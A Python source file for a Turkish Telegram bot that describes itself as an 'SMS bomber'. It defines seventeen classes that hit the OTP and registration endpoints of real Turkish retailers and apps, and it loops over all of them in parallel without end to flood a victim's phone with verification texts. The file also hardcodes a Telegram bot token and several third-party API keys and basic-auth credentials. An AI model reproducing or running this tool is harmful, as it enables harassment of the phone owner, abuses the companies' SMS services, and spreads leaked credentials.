#—————————EİZON—————————
# By @BestEizon
#—————————EİZON—————————
import subprocess, sys, os, json, time, threading, logging, concurrent.futures
import requests
from abc import ABC, abstractmethod
from time import sleep
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style, init


import pytz
import apscheduler.util as aps_util

def dummy_astimezone(tz):
    if tz is None:
        return pytz.UTC
    try:
        return pytz.timezone(str(tz))
    except Exception:
        return pytz.UTC

aps_util.astimezone = dummy_astimezone


from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, JobQueue

init(autoreset=True)




class BaseSmsProvider(ABC):
    def __init__(self, phone: str, mail: str = ""):
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(20)) + "@gmail.com"
    
    @abstractmethod
    def send(self) -> bool:
        pass

class KahveDunyasiProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json;charset=utf-8",
                "Positive-Client": "kahvedunyasi",
                "Positive-Client-Type": "web",
                "Store-Id": "1",
                "Origin": "https://www.kahvedunyasi.com",
            }
            payload = {"mobile_number": self.phone, "token_type": "register_token"}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.status_code == 200:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False



class WmfProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://www.wmf.com.tr/users/register/"
            data = {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            }
            r = requests.post(url, data=data, timeout=6)
            if r.status_code == 202:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class BimProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            r = requests.post(url, json={"phone": self.phone}, timeout=6)
            if r.status_code == 200:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class EnglishhomeProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Origin": "https://www.englishhome.com",
            }
            payload = {"Phone": "+90" + self.phone}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("isError") == False:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




      #@BESTEİZON !


class IcqProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
            }
            r = requests.post(url, headers=headers, timeout=6)
            if r.json().get("response", {}).get("statusCode") == 200:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class SuisteProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
                "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
                "Accept-Language": "en"
            }
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("code") == "common.success":
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class KimGbProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            r = requests.post(url, json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class TaziProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json;charset=utf-8",
                "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            }
            payload = {"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("kod") == "0000":
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class EvideaProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {
                "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
                "X-Project-Name": "undefined",
                "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Cache-Control": "no-store",
                "X-App-Device": "ios",
                "Referer": "https://www.evidea.com/",
                "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
                "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
            }
            data = (
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                f"content-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
                f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            )
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                # @besteizon
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False



class HeyProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = (
                f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest"
                f"?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
                f"&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            )
            headers = {
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "HEY! Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "tr"
            }
            r = requests.post(url, headers=headers, timeout=6)
            if r.json().get("IsSuccess") == True:
                # @besteizon
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False





class BisuProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "X-Device-Platform": "IOS",
                "X-Build-Version-Name": "9.4.0",
                "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e",
                "X-Build-Version-Code": "22",
                "Accept": "*/*",
                "X-Device-Manufacturer": "Apple",
                "X-Device-Locale": "en",
                "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5",
                "Accept-Language": "en-US,en;q=0.9",
                "X-Device-Platform-Version": "15.7.7",
                "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Device-Model": "iPhone 7 Plus",
                "X-Build-Type": "Release"
            }
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("errors") is None:
                return True
            else:
                raise Exception("Hata")
        except Exception:
        	 return False



class UcdortbesProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "null",
                "Connection": "close"
            }
            payload = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("error") == "E-Posta veya telefon zaten kayıtlı!":
                return False
            else:
                return True
        except Exception:
            return False





class MacroProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json",
                "Referer": "https://www.macrocenter.com.tr/kayit",
                "Content-Type": "application/json",
            }
            payload = {"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("successful") == True:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class TiklaGelsinProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {
                "Content-Type": "application/json",
                "X-Merchant-Type": "0",
                "Accept": "*/*",
                "Appversion": "2.4.1",
                "Accept-Language": "en-US,en;q=0.9",
                "X-No-Auth": "true",
                "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Device-Type": "2"
            }
            payload = {
                "operationName": "GENERATE_OTP",
                "query": ("mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {"
                          " generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"),
                "variables": {
                    "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                    "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                    "phone": f"+90{self.phone}"
                }
            }
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("data", {}).get("generateOtp") == True:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class AyyildizProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {
                "Accept": "*/*",
                "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
                "Devicetype": "mobileapp",
                "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"
            }
            r = requests.post(url, headers=headers, timeout=6)
            if r.json().get("Success") == True:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class NaosstarsProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {
                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8"
            }
            payload = {"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.status_code == 200:
                return True
            else:
                raise Exception("Hata")
        except Exception:
            return False




class IstegelsinProvider(BaseSmsProvider):
    def send(self) -> bool:
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "App-Version": "2528",
                "Platform": "IOS",
                "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "en-US,en;q=0.9"
            }
            payload = {
                "operationName": "SendOtp2",
                "query": ("mutation SendOtp2($phoneNumber: String!) { sendOtp2(phoneNumber: $phoneNumber) { "
                          "__typename alreadySent remainingTime } }"),
                "variables": {"phoneNumber": f"90{self.phone}"}
            }
            r = requests.post(url, headers=headers, json=payload, timeout=6)
            if r.json().get("data", {}).get("sendOtp2", {}).get("alreadySent") == False:
                return True
            else:
                raise Exception("Hata")
        except Exception:

            return False





class SmsManager:
    def __init__(self, phone: str, mail: str = ""):
        self.phone = phone
        self.mail = mail
        self.providers = []
        self.success_count = 0
        self.failed_count = 0
    
    def register_provider(self, provider_class):
        provider = provider_class(self.phone, self.mail)
        self.providers.append(provider)
    
    def send_all_parallel(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(self.providers)) as executor:
            while True:
                futures = [executor.submit(provider.send) for provider in self.providers]
                results = [future.result() for future in futures]
                for res in results:
                    if res:
                        self.success_count += 1
                    else:
                        self.failed_count += 1
                sleep(0.1)


sms_manager = None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        """👋 Merhaba Ben bir Sms Boomber Botuyum.
------------- 
/setsms {telefon numarasi} yazarak sms gonderimini başlatabilirsiniz.
--------------           
Bu bot Vural tarafından oluşturulmuştur"""
 )

async def set_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sms_manager
    args = context.args
    if not args:
        await update.message.reply_text("Telefon Numarası gir (+90 olmadan) : ")
        return
    
    phone = args[0]
    mail = args[1] if len(args) > 1 else ""
    
    sms_manager = SmsManager(phone, mail)
    sms_manager.register_provider(KahveDunyasiProvider)
    sms_manager.register_provider(WmfProvider)
    sms_manager.register_provider(BimProvider)
    sms_manager.register_provider(EnglishhomeProvider)
    sms_manager.register_provider(IcqProvider)
    sms_manager.register_provider(SuisteProvider)
    sms_manager.register_provider(KimGbProvider)
    sms_manager.register_provider(TaziProvider)
    sms_manager.register_provider(EvideaProvider)
    sms_manager.register_provider(HeyProvider)
    sms_manager.register_provider(BisuProvider)
    sms_manager.register_provider(UcdortbesProvider)
    sms_manager.register_provider(MacroProvider)
    sms_manager.register_provider(TiklaGelsinProvider)
    sms_manager.register_provider(AyyildizProvider)
    sms_manager.register_provider(NaosstarsProvider)
    sms_manager.register_provider(IstegelsinProvider)
    
    threading.Thread(target=sms_manager.send_all_parallel, daemon=True).start()
    
    await update.message.reply_text(
        f"sms boomber başlatildi! detaylari gormek icin /status komutunu verin!"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if sms_manager is None:
        await update.message.reply_text("Önce /setsms komutunu kullanarak SMS gönderimini başlatın.")
        return
    
    keyboard = [
        [InlineKeyboardButton(f"Gönderilen sms sayısı ✅: {sms_manager.success_count}", callback_data="refresh")],
        [InlineKeyboardButton(f"Başarısız SMSler: {sms_manager.failed_count}", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
 
    msg = await update.message.reply_text("SMS Gönderim Durumu:", reply_markup=reply_markup)
    

    context.job_queue.run_repeating(
        update_status_message,
        interval=5,
        first=5,
        data={"chat_id": update.message.chat_id, "message_id": msg.message_id},
        name=str(update.message.chat_id)
    )



async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
    job_data = context.job.data
    chat_id = job_data["chat_id"]
    message_id = job_data["message_id"]
    
    keyboard = [
        [InlineKeyboardButton(f"Gönderilen SMS sayısı ✅: {sms_manager.success_count}", callback_data="refresh")],
        [InlineKeyboardButton(f"Başarısız SMSler: {sms_manager.failed_count}", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="SMS Gönderim Durumu:",
            reply_markup=reply_markup
        )
    except Exception as e:
 
        logging.error("Hata | @BestEizon %s", e)


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(f"Gönderilen sms sayısı ✅: {sms_manager.success_count}", callback_data="refresh")],
        [InlineKeyboardButton(f"Başarısız SMSler: {sms_manager.failed_count}", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("SMS Gönderim Durumu:", reply_markup=reply_markup)

def main():
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
    
  

from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler


token = ("8054763797:AAG7K_P6ifFKrrqjjz18UHfG_aOMT6MYGg0")


application = ApplicationBuilder().token(token).build()


application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("setsms", set_sms))
application.add_handler(CommandHandler("status", status))
application.add_handler(CallbackQueryHandler(button_callback))

print("Vural Tool Farkiyla Bot Aktif! ")
application.run_polling()

if __name__ == "__main__":
    main()
    
    